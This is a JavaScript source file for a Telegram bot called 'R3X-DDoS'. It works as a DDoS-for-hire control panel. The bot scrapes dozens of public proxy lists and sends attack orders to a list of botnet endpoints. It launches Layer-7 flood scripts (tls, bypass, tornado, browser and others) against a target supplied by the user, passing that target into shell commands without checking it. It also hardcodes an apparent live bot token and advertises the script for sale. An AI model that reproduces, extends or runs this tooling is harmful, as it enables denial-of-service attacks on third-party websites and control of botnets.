const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');
const axios = require('axios');
const cheerio = require('cheerio');
const CFonts = require('cfonts');
const figlet = require("figlet")
const token = '7095538437:AAFNebiEtU_3JkgVZX1Ggfjo2hKlA4izjCA';
const bot = new TelegramBot(token, {polling: true});
const adminData = JSON.parse(fs.readFileSync('admin.json', 'utf8'));
const adminIds = adminData.admins;
const timeLimit = parseInt(adminData.limit, 10);
async function PermenMDBotnet(endpoints, target, duration, methods) {
    let successCount = 0;

    for (const endpoint of endpoints) {
        const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;
        try {
            const response = await axios.get(apiUrl);
            if (response.status === 200) {
                successCount++;
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    }

    return successCount;
}
function loadBotnetData() {
    try {
        return JSON.parse(fs.readFileSync('./ddos/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        return { endpoints: [] };
    }
}

// Fungsi untuk menyimpan data botnet ke file JSON
function saveBotnetData(botnetData) {
    try {
        fs.writeFileSync('./ddos/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
    }
}
// Fungsi untuk memeriksa status host
async function checkHost(url) {
  try {
    const response = await axios.get(url, { timeout: 5000 });
    return `Status Code: ${response.status}\nResponse Time: ${response.request.res.responseTime}ms`;
  } catch (error) {
    return `Error: ${error.message}`;
  }
}
console.log(figlet.textSync('R3X-DDoS', {
    font: 'Standard',
    horizontalLayout: 'default',
    vertivalLayout: 'default',
    whitespaceBreak: false
  }))
  
    bot.on('message', (msg) => {
        const nama = msg.from?.first_name || msg.from?.username || 'Anonymous'; // Improved name handling
        const username = msg.from?.username || 'Anonymous'; 
        const userId = msg.from?.id || 'Unknown ID'; // Handle cases where ID might not be available
        const message = msg.text || msg.caption || 'Media atau pesan lain'; // Include caption for media messages

        console.log(`\x1b[97m──⟨ \x1b[42m\x1b[97m[ @${nama} ]\x1b[50m[ @${username} ]\x1b[44m\x1b[35m[ ${userId} ]\x1b[0m`);
        console.log(`\x1b[31mPesan: \x1b[0m${message}\x1b[0m\n`);
    });

let processes = {};
const stopProcesses = (chatId) => {
  if (processes[chatId]) {
    processes[chatId].forEach(proc => proc.kill());
    processes[chatId] = [];
    bot.sendMessage(chatId, 'Proses berhasil dihentikan.');
  } else {
    bot.sendMessage(chatId, 'Tidak ada proses yang berjalan.');
  }
};
const urls = [
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
    'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/proxylist-to/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt',
    'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt',
    'https://api.openproxylist.xyz/http.txt',
    'https://api.proxyscrape.com/v2/?request=displayproxies',
    'https://api.proxyscrape.com/?request=displayproxies&proxytype=http',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'https://www.proxydocker.com/en/proxylist/download?email=noshare&country=all&city=all&port=all&type=all&anonymity=all&state=all&need=all',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=anonymous',
    'http://worm.rip/http.txt',
    'https://proxyspace.pro/http.txt',
    'https://multiproxy.org/txt_all/proxy.txt',
    'https://proxy-spider.com/api/proxies.example.txt',
    'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=100',
    'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=110',
    'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=96',
    'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=88',
    'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=5',
    'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=6',
    'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=7',
    'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=8',
    'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=9',
    'https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=10',
    'https://api.proxyscrape.com/?request=displayproxies&proxytype=http',
    'https://api.good-proxies.ru/getfree.php?count=1000&key=freeproxy',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'
];

async function scrapeProxies(chatId) {
  let proxies = [];
  const totalUrls = urls.length;
  let progressMessage = await bot.sendMessage(chatId, 'Memulai Scraper\n{ 0% }');

  for (let i = 0; i < totalUrls; i++) {
    try {
      const { data } = await axios.get(urls[i]);
      const $ = cheerio.load(data);

      $('tr').each((j, elem) => {
        const ip = $(elem).find('td').eq(0).text().trim();
        const port = $(elem).find('td').eq(1).text().trim();
        if (ip && port) {
          proxies.push(`${ip}:${port}`);
        }
      });
    } catch (error) {
      console.error(`Error scraping ${urls[i]}:`, error);
    }
    const progress = Math.round(((i + 1) / totalUrls) * 100);
    await bot.editMessageText(`Memulai Scraper\n{ ${progress}% }`, {
      chat_id: chatId,
      message_id: progressMessage.message_id
    });
  }
  fs.writeFileSync('./lib/proxy.txt', proxies.join('\n'), 'utf8');
  await bot.editMessageText('Proxy Berhasil Di Update', {
    chat_id: chatId,
    message_id: progressMessage.message_id
  });

  console.log(`Scraped ${proxies.length} proxies and saved to proxy.txt`);
}

bot.onText(/\/start/, (msg) => {
const name = msg.from.first_name;
  bot.sendMessage(msg.chat.id, 
`Hello *${name}*, Welcome To *R3X-DDoS Bot !!*

⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠤⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⣿⣦⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡆⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠇⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⣟⣋⣁⣀⣀⠀
⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇

➖➖➖➖➖➖➖➖➖➖➖➖➖➖

*MENU BOT ATTACK DDOS R3X*
/ddosmethodl7 [ Showing DDoS Method ]
/ddosmethodl4 [ Showing DDoS Method ]
/botnetmethod [ Showing Botnet Method ]
/menubotnet [ Showing Botnet Menu ]

➖➖➖➖➖➖➖➖➖➖➖➖➖➖

*🌐The Following Is Our Additional Menu:*
/upproxy [ Update This Proxy ]
/info [ Displays Complete web information ]
/script [ Want To Buy This Script? ]
/tinyurl [ Useful To Shorten Link ]
/owner [ Contact My Owner ]
/credit [ Show This Bot Credit ]

➖➖➖➖➖➖➖➖➖➖➖➖➖➖

⁉️DDoS Bot Simple By R3X-DDoS🔥
`, { parse_mode: "Markdown" });
});

bot.onText(/\/ddosmethodl7/, (msg) => {
const name = msg.from.first_name;
  bot.sendMessage(msg.chat.id, 
`Following are some of the DDoS attack methods *Layer 7* available:
『✓』--> /bypass 
『✓』--> /browser 
『✓』--> /dbotnet 
『✓』--> /tls 
『✓』--> /tlsflood
『✓』--> /tornado 
『✓』--> /duar
『✓』--> /gecko 
『✓』--> /bypassv2
『✓』--> /raw
『✓』--> /bomb
『✓』--> /ghost
『✓』--> /chaptca
『✓』--> /thunder
『✓』--> /storm
『✓』--> /floodvip
『✓』--> /kill
『✓』--> /strike
『✓』--> /cloudflarehard
『✓』--> /ninja
『✓』--> /destroy
『✓』--> /destroyV2

Example: /bypass https//example.com 60
⁉️Note: Use a method that suits the target website because not all methods are the same.
`, { parse_mode: "Markdown" });
});

bot.onText(/\/ddosmethodl4/, (msg) => {
const name = msg.from.first_name;
  bot.sendMessage(msg.chat.id, 
`DDoS Methods Layer 4 Is Coming Soon 
 `);
});

bot.onText(/\/botnetmethod/, (msg) => {
const name = msg.from.first_name;
  bot.sendMessage(msg.chat.id, 
`The following are *DDoS methods* that use botnets:
- Kill
- Strike
- Bypass
- Tls
- Ninja
- Mix
- Raw
- Browsers
- Rape
- Ghost 
- Destroy 
- Storm ( 60% )

⁉️How to use? Use like this /botnet [ Target ] [ Time ] [ Methods ]
  `, { parse_mode: "Markdown" });
});

bot.onText(/\/credit/, (msg) => {
const name = msg.from.first_name;
  bot.sendMessage(msg.chat.id, 
`*Special thanks to:*
> Allah SWT 
> R3XNotSepuh [ developer ]
> R3X [ Teach me how to DDoS ]
> FazriNotSepuh [ Added botnet feature ]
> ZENITHRen [ Provide Botnet Sc ]
> Users of this Script

*Thank you very much for:*
> YouTube (Music)
> All Indonesian Cyberteam
> My Parents
> My Family
> Pterodactyl Panel

Thanks For Using This Script❗`, { parse_mode: "Markdown" });
});

bot.onText(/\/menubotnet/, (msg) => {
const name = msg.from.first_name;
  bot.sendMessage(msg.chat.id, 
`These are the commands related to botnets here:
 /addbotnet [ Endpoint ]
 /testbotnet
 /listbotnet
 /delbotnet [ Index ]
 `);
});

bot.onText(/\/botnet(?:\s+(\S+))?(?:\s+(\S+))?(?:\s+(\S+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const username = msg.from.username;
    const isAdmin = adminIds.includes(fromId.toString());

    if (!isAdmin) {
        return bot.sendMessage(chatId, '*❌ Anda tidak memiliki izin untuk menggunakan perintah ini.*', { parse_mode: "Markdown" });
    }

    // Periksa jika kurang dari 3 argumen yang diberikan
    if (!match[1] || !match[2] || !match[3]) {
        return bot.sendMessage(chatId, '[🔎] Format: /botnet [target] [duration] [methods]\nExample: /botnet http://example.com 60 tls', { parse_mode: 'Markdown' });
    }

    bot.sendMessage(chatId, 'WET BOSS SEGERA DI SERANG');
   
    // Mendapatkan waktu saat serangan dimulai
    const startTime = new Date().toLocaleString();

    const [target, duration, methods] = [match[1].trim(), match[2].trim(), match[3].trim()];

    try {
        const parsedUrl = new URL(target);
        const hostname = parsedUrl.hostname;
        const path = parsedUrl.pathname;

        const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        const result = response.data;

        const deepinfo = `*Isp:* ${result.isp}\n*Ip:* ${result.query}\n*AS:* ${result.as}\n*Start Time:* ${startTime}\n*Running Attacks:* 1/1\n➖➖➖➖➖➖➖➖➖➖➖➖➖➖\n*Owner : (  @R3X_Jatim  )*\n*Power-Proof : (  @R3X_Jatim  )*`;
        const botnetData = JSON.parse(fs.readFileSync('./ddos/botnet.json', 'utf8'));
        const endpoints = botnetData.endpoints;

        const successCount = await PermenMDBotnet(endpoints, target, duration, methods);

        bot.sendMessage(chatId, `*🔴 Attack Succesfully Sent To🔴*\n\n*Attack By:* @${username}\n*Botnet Online:* ${successCount}\n*Target:* ${target}\n*Methods:* ${methods}\n*Duration:* ${duration} seconds\n${deepinfo}`, {
            parse_mode: 'Markdown',
            reply_markup: {
        inline_keyboard: [
          [
            {
              text: '🔍Check Target',
              url: `https://check-host.net/check-http?host=${target}`
            },
            {
              text: '🔍Join Channel',
              url: `https://t.me/BanyuwangiBl4ckHat`
            }
          ],
          [
            {
              text: '👑Owner',
              url: `https://t.me/R3X_Jatim`
            }
          ]
        ]
      },
            reply_to_message_id: msg.message_id,
        });

    } catch (error) {
        console.error(`Error: ${error.message}`);
        bot.sendMessage(chatId, '*[❗] Terjadi kesalahan saat mencoba mendapatkan informasi target.*', { parse_mode: 'Markdown' });
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/addbotnet(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const text = match[1] ? match[1].trim() : '';  // Cek apakah ada argumen

    const isAdmin = adminIds.includes(fromId.toString());

    if (!isAdmin) {
        return bot.sendMessage(chatId, '*❌ Anda tidak memiliki izin untuk menggunakan perintah ini.*', { parse_mode: "Markdown" });
    }

    if (!text) {
        return bot.sendMessage(chatId, 'Usage: /addbotnet <endpoint>\nExample: /addbotnet http://123.123.123.123:1234/permen');
    }

    try {
        const parsedUrl = new URL(text);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/permen';
        const botnetData = loadBotnetData();

        if (botnetData.endpoints.includes(endpoint)) {
            return bot.sendMessage(chatId, `Endpoint ${endpoint} is already in the botnet list.`);
        }

        botnetData.endpoints.push(endpoint);
        saveBotnetData(botnetData);
        bot.sendMessage(chatId, `Endpoint ${endpoint} added to botnet.`);
    } catch (error) {
        bot.sendMessage(chatId, `Invalid URL: ${text}`);
    }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/testbotnet/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    bot.sendMessage(chatId, 'Wait A Second...');

    const botnetData = loadBotnetData();
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=https://google.com&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    botnetData.endpoints = validEndpoints;
    saveBotnetData(botnetData);

    bot.sendMessage(chatId, `Checked endpoints. ${successCount} botnet endpoint(s) are online.`);
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/listbotnet/, (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const botnetData = loadBotnetData();
    const isAdmin = adminIds.includes(fromId.toString());

  if (!isAdmin) {
    return bot.sendMessage(chatId, '*❌ Anda tidak memiliki izin untuk menggunakan perintah ini.*', { parse_mode: "Markdown" });
  }

    if (botnetData.endpoints.length === 0) {
        return bot.sendMessage(chatId, 'Botnet list is empty.');
    }

    let response = '*Current Botnet:*\n';
    botnetData.endpoints.forEach((endpoint, index) => {
        response += `${index + 1}. ${endpoint}\n`;
    });

    bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
bot.onText(/\/delbotnet (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const index = parseInt(match[1]) - 1;  // Konversi ke indeks array
    const isAdmin = adminIds.includes(fromId.toString());

    // Cek apakah user adalah admin
    if (!isAdmin) {
        return bot.sendMessage(chatId, '*❌ Anda tidak memiliki izin untuk menggunakan perintah ini.*', { parse_mode: "Markdown" });
    }

    // Muat data botnet
    let botnetData;
    try {
        botnetData = loadBotnetData();
    } catch (error) {
        console.error('Error loading botnet data:', error);
        return bot.sendMessage(chatId, '*❌ Gagal memuat data botnet.*');
    }

    // Cek apakah array endpoints ada dan valid
    if (!Array.isArray(botnetData.endpoints)) {
        return bot.sendMessage(chatId, '*❌ Data endpoints tidak valid.*');
    }

    // Cek validitas indeks yang dimasukkan
    if (isNaN(index) || index < 0 || index >= botnetData.endpoints.length) {
        return bot.sendMessage(chatId, `Invalid index. Please provide a valid index from 1 to ${botnetData.endpoints.length}.`);
    }

    // Hapus endpoint yang sesuai
    botnetData.endpoints.splice(index, 1);

    // Simpan data botnet yang telah diperbarui
    try {
        saveBotnetData(botnetData);
    } catch (error) {
        console.error('Error saving botnet data:', error);
        return bot.sendMessage(chatId, '*❌ Gagal menyimpan perubahan data botnet.*');
    }

    bot.sendMessage(chatId, 'Botnet endpoint deleted successfully.');
});


bot.onText(/^\/dbotnet(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/dbotnet.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/gecko(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/geckold.js ${target} ${time} 32 16 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 32\nThread: 16\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/duar(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/404.js ${target} ${time} 32 16 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 32\nThread: 16\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/tornado(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/tornado.js POST ${target} ${time} 15 110 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/tls(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/tls.js ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/browser(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/browser.js ${target} ${time} 32 6 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 32\nThread: 6\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/bypass(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/bypass.js POST ${target} ${time} 32 16 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 32\nThread: 16\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/bypassv2(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/bypassv2.js  ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/raw(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/raw.js  ${target} ${time} 32 16 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 32\nThread: 16\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

bot.onText(/^\/bomb(?: (.+) (.+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];
  const time = parseInt(match[2], 10);
  const isAdmin = adminIds.includes(chatId.toString());
  if (!target) {
    bot.sendMessage(chatId, 'Target Nya Mana?');
    return;
  }
  if (!time) {
    bot.sendMessage(chatId, 'Time Nya Mana?');
    return;
  }
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menjalankan perintah ini.');
    return;
  }
  if (isNaN(time) || time > timeLimit) {
    bot.sendMessage(chatId, `Waktu tidak valid atau melebihi batas ${timeLimit}.`);
    return;
  }
  const process = exec(`node ./lib/BOMB.js  ${target} ${time} 110 15 proxy.txt`);
  if (!processes[chatId]) {
    processes[chatId] = [];
  }
  processes[chatId].push(process);
  bot.sendMessage(chatId, `Attack Successfully Send By R3X-DDoS\nTarget: ${target}\nTime: ${time}\nRate: 110\nThread: 15\nDDoS By R3X-DDoS`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Stop', callback_data: 'stop' }]
      ]
    }
  });
});

